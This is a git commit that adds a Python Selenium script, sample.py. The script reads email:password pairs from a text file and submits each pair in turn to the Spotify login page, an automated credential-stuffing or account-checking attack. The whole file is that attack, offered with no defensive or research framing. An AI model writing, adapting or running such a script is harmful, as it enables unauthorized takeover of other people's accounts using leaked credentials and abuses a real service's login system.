f17c7c9bf37299fadc83bd5a657e7f6591779642
priyaankverma08 <priyaank786@gmail.com>
2019-08-09 00:39:38 +0530

    Create sample.py

---
+++ sample.py
@@ -0,0 +1,38 @@
+# could have used constructor but a little bug re-opens the firefox window with each login iteration
+
+
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+import time
+import re
+source = open('text.txt').read()
+source_list = re.split(':|\n',source) #depends on your .txt file
+emails = []
+passwords = []
+
+
+for i in source_list[0:len(source_list):2]:
+    emails.append(i)
+for j in source_list[1:len(source_list)+1:2]:
+    passwords.append(j)
+
+
+print(emails)
+print(passwords)
+bot = webdriver.Firefox()
+
+bot.get('https://accounts.spotify.com/en/login')
+time.sleep(3)
+while bot.find_element_by_name('username') and bot.find_element_by_name('password'):
+    email = bot.find_element_by_name('username')
+    password = bot.find_element_by_name('password')
+    email.clear()
+    password.clear()
+    for i in range(len(emails)):
+        email.send_keys(emails[i])
+        password.send_keys(passwords[i])
+        password.send_keys(Keys.RETURN)
+        time.sleep(2)
+        email.clear()
+        password.clear()
+        time.sleep(2)
